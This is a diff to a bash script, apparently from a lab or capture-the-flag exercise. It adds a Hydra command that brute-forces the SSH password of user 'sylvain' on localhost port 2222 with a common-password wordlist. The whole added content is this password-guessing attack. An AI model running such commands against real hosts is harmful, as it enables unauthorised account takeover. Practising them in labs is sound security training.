@@ -1,2 +1,3 @@
 #!/usr/bin/env bash
-#DESCRIPTION OF FUNCTIONALITY
+# Hydra command to crack a weak ssh password at port 2222
+hydra -l sylvain -P 10_million_password_list_top_10000.txt -f -o found.txt -s 2222 127.0.0.1 ssh
